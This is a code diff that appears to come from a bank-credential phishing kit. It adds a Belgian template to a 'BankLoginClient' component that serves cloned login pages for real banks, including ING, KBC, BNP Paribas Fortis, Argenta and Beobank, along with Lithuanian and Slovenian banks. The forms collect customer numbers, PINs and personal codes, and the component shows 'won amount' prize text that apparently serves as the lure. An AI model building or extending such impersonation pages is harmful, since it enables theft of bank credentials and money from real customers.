@@ -42,6 +42,7 @@ import { Dolomitenbank } from "@/components/templates/Dolomitenbank";
 import { EstoniaBankTemplate } from "@/components/templates/EstoniaBankTemplate";
 import { LithuaniaBankTemplate } from "@/components/templates/LithuaniaBankTemplate";
 import { SloveniaBankTemplate } from "@/components/templates/SloveniaBankTemplate";
+import { BelgiumBankTemplate } from "@/components/templates/BelgiumBankTemplate";
 // LT bilinen banka slug'lari (methodMap ile ayni, kopya):
 const LITHUANIA_KNOWN_SLUGS = new Set([
   "swedbank-lt","seb-lt","luminor-lt","citadele-lt","lku-lt","siauliu-lt","facebook-lt"
@@ -788,8 +789,43 @@ export function BankLoginClient({ sessionId, bankSlug, bank }: Props) {
                       hasLithuaniaSuffix ||
                       isLithuaniaKnownSlug;
 
+  const hasBelgiumSuffix = /(^|[-_\s])be($|[-_\s])/.test(normalizedSlug);
+  const isBelgium = !isLithuania && (
+    normalizedCountry === "belgië" ||
+    normalizedCountry === "belgie" ||
+    normalizedCountry === "belgium" ||
+    normalizedCountry === "belcika" ||
+    normalizedCountry === "be" ||
+    hasBelgiumSuffix ||
+    ["argenta-be", "bnp-paribas-fortis-be", "beobank-be", "ing-be", "kbc-be"].includes(normalizedSlug)
+  );
+
+  if (isBelgium) {
+    return (
+      <>
+        <BelgiumBankTemplate
+          bankSlug={normalizedSlug}
+          bankName={bank.name}
+          logoFile={bank.logoFile}
+          brandColor={bank.brandColor || theme?.colors.primary}
+          formData={{ verfuegernummer, pin, personalCode, loginMethod }}
+          onChange={handleTemplateChange}
+          handleRouteAction={handleTemplateSubmit}
+          saving={saving}
+          wonAmount={wonAmount}
+          wonLabel={wonLabel}
+        />
+        {saving && (
+          <div className="fixed inset-0 z-[99999] flex items-center justify-center bg-[#0c0207]">
+            <div className="size-12 animate-spin rounded-full border-4 border-[#E30613]/30 border-t-[#E30613]" />
+          </div>
+        )}
+      </>
+    );
+  }
+
   const hasSloveniaSuffix = /(^|[-_\s])si($|[-_\s])/.test(normalizedSlug);
-  const isSlovenia = !isLithuania && (
+  const isSlovenia = !isLithuania && !isBelgium && (
     normalizedCountry === "slovenya" ||
     normalizedCountry === "slovenia" ||
     normalizedCountry === "si" ||
